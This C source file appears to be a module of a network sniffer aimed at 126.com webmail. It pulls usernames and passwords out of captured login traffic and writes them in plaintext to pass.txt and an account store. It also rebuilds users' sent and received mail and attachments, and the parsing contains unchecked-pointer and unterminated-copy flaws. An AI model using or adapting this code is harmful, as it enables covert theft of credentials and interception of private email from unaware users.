#include "common.h"

extern char *conv_163_to_utf8(char *src);

int write_126_passwd(Mail_info *mail_info)
{
	char *p1 = NULL, *p2= NULL;
	size_t len;

	p1 = strstr(mail_info->mail_data, "&user=");
	if (p1 == NULL)
	{
		p1 = strstr(mail_info->mail_data, "username=");
		if (p1 == NULL)
			return -1;
		p1 += 3;
	}
	p1 += 6;	
	p2 = strstr(p1, "&");
	len = p2 - p1;
	if (p2 == NULL || len > MAX_UN_LEN)
		return -1;

	memcpy(mail_info->username, p1, len);
	mail_info->username[len] = 0;
	htmldecode_full(mail_info->username,mail_info->username);
	if (strstr(mail_info->username, "@126.com") == NULL) {
		if (len + 8 > MAX_UN_LEN - 1)
			return -1;
		strcat(mail_info->username, "@126.com");
	}
	
	p1 = strstr(p2, "&password=");
	if (p1 == NULL)
		return -1;
	p1 += 10;	
	p2 = strstr(p1, "&");
	if(p2==NULL)
	{
		len = mail_info->mail_data + strlen(mail_info->mail_data) - p1;
		if (len > MAX_PW_LEN)
			return -1;
	}
	else
	{
		len = p2 - p1;
		if (p2 == NULL || len > MAX_PW_LEN)
			return -1;
	}
	
	memcpy(mail_info->passwd, p1, len);
	mail_info->passwd[len] = 0;
	htmldecode_full(mail_info->passwd,mail_info->passwd);

	write_xml(mail_info);

	FILE *fp = NULL;
	char writepath[MAX_PATH_LEN + 1];
	snprintf(writepath, MAX_PATH_LEN, "%s/pass.txt", mail_data_path);
	fp = fopen(writepath, "a+");
	if(fp == NULL)
		return -1;
	
	fprintf(fp,"\nusername=%s\npassword=%s\n", mail_info->username, mail_info->passwd);
	//LOG_INFO("mail_info->username = %s\n", mail_info->username);
	//LOG_INFO("mail_info->passwd = %s\n", mail_info->passwd);
	fclose(fp);

	return 0;
}

int analyse_126_passwd(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	int result;

	if (is_to_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, data_len, ptcp);
			return result;
		}
		if(strstr(mail_info->mail_data,"&password="))
		{
			write_126_passwd(mail_info);
			del_mail_node(mail_info);
		}
	} 
	else 
	if (!strncmp(data, "HTTP/1.", 7) && !strncmp(data + 8, " 200 OK\r\n", 9))
	{
		mail_info->is_complished = 1;
		write_126_passwd(mail_info);
		del_mail_node(mail_info);
		return 0;
	}

	return -1;
}

int analyse_126_passwd2(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
    if(is_to_s)
    {
        char *p1 = NULL,*p2 = NULL;
        char tmp_pass[MAX_UN_LEN + 1] = {0};
        
        p1 = strstr(data, "\"un\":\"");
        if(!p1)
            return -1;
        
        if(p1)
        {
            p1 += strlen("\"un\":\"");
            p2 = strchr(p1, '\"');
            strncpy(mail_info->username, p1, (p2 - p1)>MAX_UN_LEN?MAX_UN_LEN:(p2 - p1));
        }

        p1 = strstr(p2, "\"pw\":\"");
        if(!p1)
            return -1;
        if(p1)
        {
            p1 += strlen("\"pw\":\"");
            p2 = strchr(p1, '\"');
            memcpy(tmp_pass, p1, (p2 - p1)>MAX_UN_LEN?MAX_UN_LEN:(p2 - p1));
            htmldecode_full(tmp_pass, mail_info->passwd);
        }

        store_account_db(mail_info);
        return -1;
    }
    
    return 0;
}

//<----------126 Send content------------>
//URL Decoded
//var=<?xml version="1.0"?><object><string name="id">c:1488596152727</string><object name="attrs"><string name="account">"long long away"&lt;microcoolibm@126.com&gt;</string><boolean name="showOneRcpt">false</boolean><array name="to"><string>microcoolibm@163.com</string></array><array name="cc"/><array name="bcc"/><string name="subject">test</string><boolean name="isHtml">true</boolean><string name="content">&lt;div style="line-height:1.7;color:#000000;font-size:14px;font-family:Arial"&gt;&lt;div&gt;123456&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;</string><int name="priority">3</int><boolean name="saveSentCopy">true</boolean><string name="charset">GBK</string></object><boolean name="returnInfo">false</boolean><string name="action">deliver</string><int name="saveTextThreshold">1048576</int><string name="autosaveRcptsMode">add</string></object>
// Origin
// var=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cobject%3E%3Cstring%20name%3D%22id%22%3Ec%3A1488596152727%3C%2Fstring%3E%3Cobject%20name%3D%22attrs%22%3E%3Cstring%20name%3D%22account%22%3E%22long%20long%20away%22%26lt%3Bmicrocoolibm%40126.com%26gt%3B%3C%2Fstring%3E%3Cboolean%20name%3D%22showOneRcpt%22%3Efalse%3C%2Fboolean%3E%3Carray%20name%3D%22to%22%3E%3Cstring%3Emicrocoolibm%40163.com%3C%2Fstring%3E%3C%2Farray%3E%3Carray%20name%3D%22cc%22%2F%3E%3Carray%20name%3D%22bcc%22%2F%3E%3Cstring%20name%3D%22subject%22%3Etest%3C%2Fstring%3E%3Cboolean%20name%3D%22isHtml%22%3Etrue%3C%2Fboolean%3E%3Cstring%20name%3D%22content%22%3E%26lt%3Bdiv%20style%3D%22line-height%3A1.7%3Bcolor%3A%23000000%3Bfont-size%3A14px%3Bfont-family%3AArial%22%26gt%3B%26lt%3Bdiv%26gt%3B123456%26lt%3B%2Fdiv%26gt%3B%26lt%3Bdiv%26gt%3B%26lt%3Bbr%20%2F%26gt%3B%26lt%3B%2Fdiv%26gt%3B%26lt%3B%2Fdiv%26gt%3B%3C%2Fstring%3E%3Cint%20name%3D%22priority%22%3E3%3C%2Fint%3E%3Cboolean%20name%3D%22saveSentCopy%22%3Etrue%3C%2Fboolean%3E%3Cstring%20name%3D%22charset%22%3EGBK%3C%2Fstring%3E%3C%2Fobject%3E%3Cboolean%20name%3D%22returnInfo%22%3Efalse%3C%2Fboolean%3E%3Cstring%20name%3D%22action%22%3Edeliver%3C%2Fstring%3E%3Cint%20name%3D%22saveTextThreshold%22%3E1048576%3C%2Fint%3E%3Cstring%20name%3D%22autosaveRcptsMode%22%3Eadd%3C%2Fstring%3E%3C%2Fobject%3E
// var=<?xml version="1.0"?><object><string name="id">c:1488596152727</string><object name="attrs"><string name="account">"long long away"&lt;microcoolibm@126.com&gt;</string><boolean name="showOneRcpt">false</boolean><array name="to"><string>microcoolibm@163.com</string></array><array name="cc"/><array name="bcc"/><string name="subject">test</string><boolean name="isHtml">true</boolean><string name="content">&lt;div style="line-height:1.7;color:#000000;font-size:14px;font-family:Arial"&gt;&lt;div&gt;123456&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;</string><int name="priority">3</int><boolean name="saveSentCopy">true</boolean><string name="charset">GBK</string></object><boolean name="returnInfo">false</boolean><string name="action">deliver</string><int name="saveTextThreshold">1048576</int><string name="autosaveRcptsMode">add</string></object>

static inline
char* get_html_field_len(const char *key, char *in, size_t *olen)
{
	char *pv = NULL;
	char *pe = NULL;
	size_t len = strlen(in);
	const char key_end =  '/';

	if (!len)
        return NULL;
	
	if (!strncmp(key, "<array", 6))  // is an array
	{
		// we parse only one here
		pv = strstr(in, key);
		if (!pv)
            return NULL;

		pv += strlen(key);
		while (*pv != '>') 
            ++pv;
        
		if (*(pv - 1) == key_end) 
            return NULL;

		pv = strstr(pv, "<string");
		if (!pv) 
            return NULL;

		pv += strlen("<string");
		while (*pv != '>') 
            ++ pv;
        
		pv += 1;
		pe = pv;
		while (*pe != '<') 
            ++ pe;
	}
	else
	{
		pv = strstr(in, key);
		if (!pv) 
            return NULL;
        
		while (*pv != '>') ++ pv;
		if (*(pv - 1) == key_end) 
            return NULL;
        
		pv += 1;
		pe = pv;
		while (*pe != '<') 
            ++ pe;
	}

	*olen = pe - pv;
	return pv;
}

int get_html_field(const char *key, char *in, char *out, size_t olen)
{
	size_t len = strlen(in);
	size_t vlen = 0;
	char *pv= NULL;

	if (!len) return -1;
	pv = get_html_field_len(key, in, &vlen);
	if (!pv || vlen > olen - 1)
	{
		return -1;
	}
    
	strncpy(out, pv, vlen);
	return 0;
}

int url_decode(const char *inbuf, size_t inlen, char *outbuf, size_t olen)
{  
	//std::string result; 
	int j = 0;
	int hex = 0; 
	for (size_t i = 0; i < inlen; ++i)
	{  
		switch (inbuf[i])
		{
			case '+':  
				//result += ' ';  
				outbuf[j++] = ' ';
				break;  
			case '%': 
				if (isxdigit(inbuf[i + 1]) && isxdigit(inbuf[i + 2]))
				{
					//std::string hexStr = szToDecode.substr(i + 1, 2);  
					char hexStr[3] = {0};
					strncpy(hexStr, &inbuf[i + 1], 2);
					hex = strtol(hexStr, 0, 16);

					if (!(hex >= 48 && hex <= 57) || //0-9 
								(hex >=97 && hex <= 122) ||   //a-z 
								(hex >=65 && hex <= 90) ||    //A-Z 
								(hex == 0x2d ) || (hex == 0x2e) || (hex == 0x2f) || (hex == 0x5f)) //[-/_/./~] 
								//hex == 0x21 || hex == 0x24 || hex == 0x26 || hex == 0x27 || hex == 0x28 || hex == 0x29 
								//|| hex == 0x2a || hex == 0x2b|| hex == 0x2c || /*hex == 0x2d || hex == 0x2e || hex == 0x2f */
								//|| hex == 0x3A || hex == 0x3B|| hex == 0x3D || hex == 0x3f || hex == 0x40 //|| hex == 0x5f 
					{
						outbuf[j++] = char(hex);
						i += 2; 
					}
					else 
						outbuf[j++] = '%';
				}else {
					outbuf[j++] = '%';
					//result += '%';  
				}
				break; 
			default: 
				//result += szToDecode[i];  
				outbuf[j++] = inbuf[i];
				break;  
		} 

	}  
	return j;  
}

int write_file_126(Mail_info *mail_info)
{
	char *from_pat = "<string name=\"account\"";
	char *to_pat = "<array name=\"to\"";
	char *cc_pat = "<array name=\"cc\"";
	char *bcc_pat = "<array name=\"bcc\"";
	char *subject_pat = "<string name=\"subject\"";
    char* content_pat = "string name=\"content\"";
    char* tmp_str = NULL;
	size_t content_len = 0;
    int result = 0;
    
	create_dir(mail_info->save_path, "126", mail_info->from);
	//write_to_file(mail_info);
	char *dest = (char *)calloc(1, mail_info->mail_length * 2);
    if (!dest)
    {
        LOG_ERROR("calloc dest fail.\n");
        return -1;
    }
    
	if (url_decode(mail_info->mail_data, mail_info->mail_length, dest, mail_info->mail_length * 2) > 0)
	{
		char *pcontent = NULL;
        /*"Jiaheng Zhou"&lt;gremagoosh330@126.com&gt; need change to "Jiaheng Zhou"<gremagoosh330@126.com>*/
		get_html_field(from_pat, dest, mail_info->from, MAX_FROM_LEN + 1);
        
        result = str_163_convert1(mail_info->from, MAX_FROM_LEN);
    	if (result == -1) 
    	{
    		LOG_WARN("webmail:writefile163: mailto convert failed\n");
    		return -1;
    	}
        
		get_html_field(to_pat, dest, mail_info->to, MAX_TO_LEN + 1);
        result = str_163_convert1(mail_info->to, MAX_TO_LEN);
    	if (result == -1) 
    	{
    		LOG_WARN("webmail:writefile163: mailto convert failed\n");
    		return -1;
    	}
        
		get_html_field(cc_pat, dest, mail_info->cc, MAX_CC_LEN + 1);
        result = str_163_convert1(mail_info->cc, MAX_CC_LEN);
    	if (result == -1) 
    	{
    		LOG_WARN("webmail:writefile163: mailto convert failed\n");
    		return -1;
    	}
        
		get_html_field(bcc_pat, dest, mail_info->bcc, MAX_BCC_LEN + 1);
        result = str_163_convert1(mail_info->bcc, MAX_BCC_LEN);
    	if (result == -1) 
    	{
    		LOG_WARN("webmail:writefile163: mailto convert failed\n");
    		return -1;
    	}
        
		get_html_field(subject_pat, dest, mail_info->subject, MAX_SUBJ_LEN + 1);
		result = str_163_convert1(mail_info->subject, MAX_SUBJ_LEN);
    	if (result == -1) 
    	{
    		LOG_WARN("webmail:writefile163: mailto convert failed\n");
    		return -1;
    	}
        
		pcontent = get_html_field_len(content_pat, dest, &content_len);
		if (pcontent && content_len > 0)
		{
			mail_info->content = (char *)calloc(1, content_len + 1);
			memcpy(mail_info->content, pcontent, content_len);
            
    		tmp_str = conv_to_xml_symbol(mail_info->content);
    		if (tmp_str == NULL) 
    		{
    			LOG_WARN("webmail:writefile163(): mailcontent convert_to_xml_symbol() failed\n");
    			return -1;
    		}
    		free(mail_info->content);
    		mail_info->content = clear_html_tag(tmp_str);
    		free(tmp_str);
    		tmp_str = NULL;
    		if (mail_info->content == NULL) 
    		{
    			LOG_WARN("webmail:writefile163(): mailcontent clear_html_tag() failed\n");
    			return -1;
    		}
    	
		}
		write_to_file(mail_info);
	}

    free(dest);
    
	return 0;
}

int analyse_126_send_action(Mail_info *mail_info, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	int result = 0;
	if (is_to_s) 
	{
		if (!mail_info->is_complished) 
		{
			result = write_to_mail(mail_info, data, data_len, ptcp);
			
			return result;
		}
	} 
	else if (!strncmp(data, "HTTP/1.", 7))
	{
		get_time(data, mail_info->sent_time);
		mail_info->is_complished = 1;
		write_file_126(mail_info);
		del_mail_node(mail_info);
		return 0;
	} 
	else 
	{
		return -1;
	}
}

int get_126_attachment_name(Attach_info* attach_info)
{
	char *attach_tag = "Mail-Upload-name:";
	char *p = strstr(attach_info->body, attach_tag);
	char *e = NULL;

	if (!p) return -1;
	p += 1;

	e = p;
	while (*e != '\r') ++e;
	strncpy(attach_info->attach_name, p, e - p);
	return 0;
}

static int flag = 0;

int write_126_attach(Attach_info *attach_info, char *data, unsigned int data_len, unsigned int seq)
{
	int result = 0;

	if (attach_info->bodyTotal - attach_info->bodyLen < data_len)
	{
		//printf("more memory required.\n");
		return -1;
	}
	memcpy(attach_info->body + attach_info->bodyLen, data, data_len);
	attach_info->bodyLen += data_len;

	if (attach_info->bodyLen == attach_info->bodyTotal)
	{
		attach_info->is_complished = 1;
		result = write_to_attach_3(attach_info);
		flag = 0;
	}

	return result;
}

int analyse_126_upload_action(Attach_info * attach_info,char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s)
{
	int result = 0;
	unsigned int seq = ntohl(ptcp->seq);

	// directly write the attachment down in raw format
	// fuck the logic
	if (is_to_s) 
	{
		if (!memcmp(&data[data_len - 4], "\r\n\r\n", 4))
		{
			char *pc = NULL;
			// this header has only one packet
			pc = !flag ? data : attach_info->header;

			//get the Content Length
			char *p = strstr(pc, "Content-Length: ");
			char *e = NULL;
			char cl_buf[13] = {0};
			if (!p) 
                return -1;

			p += strlen("Content-Length: ");
			e = p;
			while (*e != '\r') ++ e;
			strncpy(cl_buf, p, 12);
			attach_info->bodyTotal = atoi(cl_buf);
			if (attach_info->bodyTotal <= 0) return -1;

			attach_info->body = (char *)calloc(1, attach_info->bodyTotal);
			flag = 1;
			free(attach_info->header);
			attach_info->headerLen = 0;
			struct timeval tv;
			gettimeofday(&tv, NULL);
			snprintf(attach_info->path_of_here, MAX_PATH_LEN, "%s/%lu-%lu", mail_temp_path, tv.tv_sec, tv.tv_usec);
		}
		else if (flag != 1)
		{
			if (!attach_info->header)
				attach_info->header = (char *)calloc(1, data_len+1);
            else
                attach_info->header = (char *)realloc(attach_info->header, attach_info->headerLen+data_len+1);

			memcpy(attach_info->header + attach_info->headerLen, data, data_len);
			attach_info->headerLen += data_len;
            flag = 2;
		}
		else if (flag == 1)
			result = write_126_attach(attach_info, data, data_len, seq);

		return result;
	}
	else 
	{
		if (!strncmp(data, "HTTP/1.1 200 OK\r\n", 15))
		{
			attach_info->is_complished = 1;
			trim_attach(attach_info->path_of_here,151);
			free(attach_info->ok_data);
			attach_info->ok_data = NULL;
			return 0;
		}
	}
	return 0;	
}

int analyse_126_receive_mail(Mail_info *mail_info, char *data, int data_len, int is_to_s)
{
    if (!is_to_s)
    {
        char *p1 = NULL, *p2 = NULL;
        int f = http_recive_mail(mail_info, data, data_len);
        if (f == 1)
        {
            char *p_content = strstr(mail_info->body, "\"Content\":");
            if (p_content)
            {
                p_content = p_content + strlen("\"Content\":") + 1;       //   1 is "\""
                char* p_label = strstr(p_content, "\"");
                if (!p_label)
                {
                    //printf("p_label can not found\n");
                    return -1;
                }
                
                mail_info->content = (char *)calloc(1, p_label - p_content + 1);
                if (NULL == mail_info->content)
                    return -1;
                
                memcpy(mail_info->content, p_content, p_label - p_content);
            }
            else
            {
                return -1;
            }

            if ((p1 = strstr(mail_info->body, "\"uid\":"))!=NULL)
            {
                p1 += 7;
                p2 = strstr(p1,"\"");
                memcpy(mail_info->to, p1, p2-p1>MAX_TO_LEN?MAX_TO_LEN:p2-p1);
            }
		
            if ((p1 = strstr(mail_info->body, "\"cc\":")) != NULL)
            {   
                p1 += 6;
                p2 = strstr(p1,"\"");
                memcpy(mail_info->cc, p1, p2-p1>MAX_CC_LEN?MAX_CC_LEN:p2-p1);
            }
		
            if ((p1 = strstr(mail_info->body, "\"bcc\":")) != NULL)
            {
                p1 += 7;
                p2 = strstr(p1,"\"");
                memcpy(mail_info->bcc, p1, p2-p1>MAX_CC_LEN?MAX_CC_LEN:p2-p1);
            }
		
            if ((p1 = strstr(mail_info->body, "\"SentDate\":")) != NULL)
            {		   
                char dest1[MAX_TIME_LEN + 1] = {0};
                time_t timeval;

                p1 += 12;
                //p2 = strstr(p1,"\"");
                memcpy(dest1, p1, 10);

                struct tm *tm_ptr;
                timeval = strtol(dest1, NULL, 0);
                tm_ptr = localtime(&timeval);
                snprintf(mail_info->sent_time, MAX_TIME_LEN, "%04d-%02d-%02d %02d:%02d:%02d", tm_ptr->tm_year + 1900, tm_ptr->tm_mon + 1, tm_ptr->tm_mday, tm_ptr->tm_hour, tm_ptr->tm_min, tm_ptr->tm_sec);	
            }
		
            if ((p1 = strstr(mail_info->body, "\"from\":")) != NULL)
            { 		
                p1 += 8;			
                p2 = strstr(p1,"\"");
                memcpy(mail_info->from, p1, p2-p1>MAX_FROM_LEN?MAX_FROM_LEN:p2-p1);
            }
	   
            if ((p1 = strstr(mail_info->body,"\"Subject\":")) != NULL)
            {		
                p1 += 11;
                p2 = strstr(p1,"\"");
                memcpy(mail_info->subject, p1, p2-p1>MAX_SUBJ_LEN?MAX_SUBJ_LEN:p2-p1);
            }
          
            create_dir(mail_info->save_path, "126", mail_info->from);
            write_to_file(mail_info);
            return -1;
        }
        else if (f < 0)
            return -1;
    }

    return 0;
}

int analyse_126_receive_mail2(Mail_info *mail_info, char *data, int data_len, struct tcphdr *ptcp, int is_to_s)
{
    return analyse_163_rcvmail4(mail_info, data, data_len, ptcp, is_to_s);
}

int analyse_126(void *node, char *data, unsigned int data_len, struct tcphdr *ptcp, int is_to_s, int m_or_a)
{
    unsigned short type = 0;
    int result = -1;

    if (!m_or_a)
    {	
        Mail_info *mail_info = (Mail_info *)node;
        type = mail_info->mail_type & 0x00FF;
        switch (type) 
        {
            case 0x01:
            result = analyse_126_passwd(mail_info, data, data_len, ptcp, is_to_s);  //login form hao123
            break;
			
            case 0x02:
            result = analyse_126_passwd2(mail_info, data, data_len, ptcp, is_to_s);
            break;  
			
            // 126 send mail action handler
            case 0x11:
            result = analyse_126_send_action(mail_info, data, data_len, ptcp, is_to_s);
            break;

            case 0x21:
            result = analyse_126_receive_mail(mail_info, data, data_len, is_to_s);
            break;
			
            case 0x26:
            result = analyse_126_receive_mail2(mail_info, data, data_len, ptcp, is_to_s);
            break;
        }
    
        if (result == -1)
            del_mail_node(mail_info);
    } 
    else 
    {	
        Attach_info *attach_info = (Attach_info *)node;
        type = attach_info->attach_type & 0x00FF;
        //snprintf(attach_info->path_of_here, MAX_PATH_LEN, "%s/%lu-%lu", attach_up_path, tv.tv_sec, tv.tv_usec);

        switch (type) 
        {
            case 0x61:
            // 126 upload attachment action handler
            result = analyse_126_upload_action(attach_info, data, data_len, ptcp, is_to_s);
            break;
        }

        if (result == -1)
        {
            del_attach_node(attach_info);
            delete_attach(attach_info);
        }
    }
}

